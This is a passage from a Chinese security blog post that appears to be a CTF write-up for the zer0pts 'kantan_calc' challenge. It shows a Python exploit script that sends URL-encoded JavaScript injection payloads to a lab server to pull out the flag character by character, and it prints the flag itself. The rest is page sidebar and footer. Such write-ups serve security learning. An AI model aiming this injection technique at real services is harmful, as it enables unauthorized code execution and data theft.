+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://192.168.40.131:8004/?code=&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>):</span><br><span class="line">    str1=<span class="string">f&quot;%7D%2Cthis.a%3D%28%29%3D%3E%7Breturn%28a%2B1%29%5B<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>%5D&quot;</span></span><br><span class="line">    result=requests.get(url=url+str1)</span><br><span class="line">    flag+=re.search(<span class="string">r&quot;&lt;output&gt;(.*)&lt;/output&gt;&quot;</span>,result.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">//zer0pts&#123;K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3&#125; </span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io">lanb0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io/2023/08/06/[JS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83]%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A34/">https://wustzhb.github.io/2023/08/06/[JS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83]%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A34/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wustzhb.github.io" target="_blank">Lanb0's blog|一个默默无闻的网安爱好者</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/08/04/JS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5B%E4%BA%8C%5D-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="JS代码审计[二] 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JS代码审计[二] 学习笔记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/28/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5D%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A2WP/" title="[JS专项训练]课后作业1WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-28</div><div class="title">[JS专项训练]课后作业1WP</div></div></a></div><div><a href="/2023/07/28/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5D%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9AWP-1/" title="[JS专项训练]课后作业1WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-28</div><div class="title">[JS专项训练]课后作业1WP</div></div></a></div><div><a href="/2023/08/04/JS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5B%E4%BA%8C%5D-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="JS代码审计[二] 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-04</div><div class="title">JS代码审计[二] 学习笔记</div></div></a></div><div><a href="/2023/07/23/JS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5B%E4%B8%80%5D-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="JS代码审计[一] 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-23</div><div class="title">JS代码审计[一] 学习笔记</div></div></a></div><div><a href="/2023/05/16/%5B2023AliyunCTF%5DWEB%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-16</div><div class="title">[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析</div></div></a></div><div><a href="/2023/06/09/%5B2023%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5DWEB%E5%A4%8D%E7%8E%B0/" title="[2023陕西省大学生网络安全大赛]WEB复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-09</div><div class="title">[2023陕西省大学生网络安全大赛]WEB复现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lanb0</div><div class="author-info__description">充实地过好每一天</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://qm.qq.com/cgi-bin/qm/qr?k=Ga7oV2UM08biI8VudKTeFcEdzYPbbXdz&amp;noverify=0&amp;personal_qrcode_source=4" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">没什么大事要宣布的</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#timetodraw"><span class="toc-number">1.</span> <span class="toc-text">timetodraw</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.</span> <span class="toc-text">思路:JS原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Payload"><span class="toc-number">3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kantan-calc"><span class="toc-number">4.</span> <span class="toc-text">kantan_calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">所需知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">4.1.1.</span> <span class="toc-text">逗号运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%8F%B7%E8%BF%90%E7%AE%97"><span class="toc-number">4.1.2.</span> <span class="toc-text">加号运算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%87%BD%E6%95%B0%E4%BD%93"><span class="toc-number">4.1.3.</span> <span class="toc-text">表达式函数体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp"><span class="toc-number">4.2.</span> <span class="toc-text">WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.2.0.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exp"><span class="toc-number">4.2.0.2.</span> <span class="toc-text">Exp</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/06/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5D%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A34/" title="[JS专项训练]课后作业34">[JS专项训练]课后作业34</a><time datetime="2023-08-06T14:50:00.000Z" title="发表于 2023-08-06 22:50:00">2023-08-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/04/JS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5B%E4%BA%8C%5D-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="JS代码审计[二] 学习笔记">JS代码审计[二] 学习笔记</a><time datetime="2023-08-04T09:36:00.000Z" title="发表于 2023-08-04 17:36:00">2023-08-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/01/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E7%BD%91%E7%BB%9C%E6%9F%A5%E6%9D%80%E4%B8%8E%E8%A7%84%E9%81%BF/" title="[免杀学习]网络查杀与规避">[免杀学习]网络查杀与规避</a><time datetime="2023-08-01T15:16:00.000Z" title="发表于 2023-08-01 23:16:00">2023-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/30/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%89%AB%E6%8F%8F%E6%B5%85%E6%9E%90(%E4%B8%8B)/" title="[免杀学习]杀毒软件扫描浅析(下)">[免杀学习]杀毒软件扫描浅析(下)</a><time datetime="2023-07-30T14:54:00.000Z" title="发表于 2023-07-30 22:54:00">2023-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/30/%E5%9F%BA%E4%BA%8ELazyList%E7%9A%84Scala%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%8F%E6%9E%90(CVE-2022-36944)/" title="基于LazyList的Scala反序列化漏洞透析(CVE-2022-36944)">基于LazyList的Scala反序列化漏洞透析(CVE-2022-36944)</a><time datetime="2023-07-30T14:54:00.000Z" title="发表于 2023-07-30 22:54:00">2023-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/index_img.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By lanb0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到lanb0的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>
